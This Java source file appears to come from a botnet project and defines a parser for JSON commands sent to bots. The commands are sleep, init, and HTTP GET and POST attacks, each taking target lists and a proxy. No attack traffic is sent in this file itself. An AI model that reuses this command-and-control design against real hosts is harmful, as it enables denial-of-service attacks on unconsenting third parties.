/**
 * The MIT License (MIT)
 * <p>
 * Copyright (c) 2016 Giacomo Marciani and Michele Porretta
 * <p>
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * <p>
 * <p>
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * <p>
 * <p>
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package com.acmutv.botnet.bot.command;

import com.acmutv.botnet.target.HttpTarget;
import com.acmutv.botnet.target.HttpTargetProxy;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes command prsing utilities.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
public class BotCommandParser {

  /**
   * Parses a BotCommand from a JSON.
   * @param json the JSON to parse.
   * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
   */
  public static BotCommand from(String json) {
    InputStream stream = new ByteArrayInputStream(json.getBytes(StandardCharsets.UTF_8));
    return BotCommandParser.from(stream);
  }

  /**
   * Parses a BotCommand from a JSON.
   * @param json the JSON to parse.
   * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
   */
  public static BotCommand from(InputStream json) {
    BotCommand cmd = new BotCommand();
    ObjectMapper mapper = new ObjectMapper();

    JsonNode node;
    try {
      node = mapper.readValue(json, JsonNode.class);
    } catch (IOException e) {
      return cmd;
    }
    if (node.has("command")) {
      cmd.setScope(CommandScope.from(node.get("command").asText("NONE")));
    }
    if (cmd.getScope().isWithParams()) {
      switch (cmd.getScope()) {
        case SLEEP:
          final int sleepAmount = node.get("amount").asInt(10);
          final TimeUnit sleepUnit = TimeUnit.valueOf(node.get("unit").asText("SECONDS"));
          cmd.getParams().put("amount", sleepAmount);
          cmd.getParams().put("unit", sleepUnit);
          break;
        case INIT:
          final String initResource = node.get("resource").asText(null);
          cmd.getParams().put("resource", initResource);
          break;
        case ATTACK_HTTP_GET:
          if (node.has("targets")) {
            List<HttpTarget> targets =
                BotCommandParser.parseList(mapper, node.get("targets"), HttpTarget.class);
            cmd.getParams().put("targets", targets);
          }

          if (node.has("proxy")) {
            HttpTargetProxy proxy =
                BotCommandParser.parseObject(mapper, node.get("proxy"), HttpTargetProxy.class);
            cmd.getParams().put("proxy", proxy);
          }
          break;
        case ATTACK_HTTP_POST:
          if (node.has("targets")) {
            List<HttpTarget> targets =
                BotCommandParser.parseList(mapper, node.get("targets"), HttpTarget.class);
            cmd.getParams().put("targets", targets);
          }

          if (node.has("proxy")) {
            HttpTargetProxy proxy =
                BotCommandParser.parseObject(mapper, node.get("proxy"), HttpTargetProxy.class);
            cmd.getParams().put("proxy", proxy);
          }
          break;
      }
    }

    return cmd;
  }

  /**
   * Parses a list of objects from a JSON node.
   * @param mapper the JSON mapper.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed list of objects; an empty list, in case of error.
   */
  private static <T> List<T> parseList(ObjectMapper mapper, JsonNode node, Class<T> type) {
    List<T> list = new ArrayList<>();
    node.forEach(n -> {
      try {
        T obj = mapper.treeToValue(n, type);
        list.add(obj);
      } catch (JsonProcessingException e) {
        e.printStackTrace();
      }
    });
    return list;
  }

  /**
   * Parses an object from a JSON node.
   * @param mapper the JSON mapper.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed object; null, in case of error.
   */
  private static <T> T parseObject(ObjectMapper mapper, JsonNode node, Class<T> type) {
    T obj;
    try {
      obj = mapper.treeToValue(node, type);
    } catch (JsonProcessingException e) {
      e.printStackTrace();
      obj = null;
    }
    return obj;
  }

  /**
   * Parses a BotCommand from a line.
   * @param line the line to parse.
   * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
   */
  /*
  public static BotCommand fromString(final String line) {
    BotCommand cmd = new BotCommand();

    final String entries[] = line.split(" ");
    cmd.setScope(CommandScope.from(entries[0].trim()));
    if (entries.length > 1) {
      final String pairs[] = entries[1].split(";");
      for (String pair : pairs) {
        final String kv[] = pair.trim().split(":");
        cmd.getParams().put(kv[0], kv[1]);
      }
    }

    return cmd;
  }
  */
}
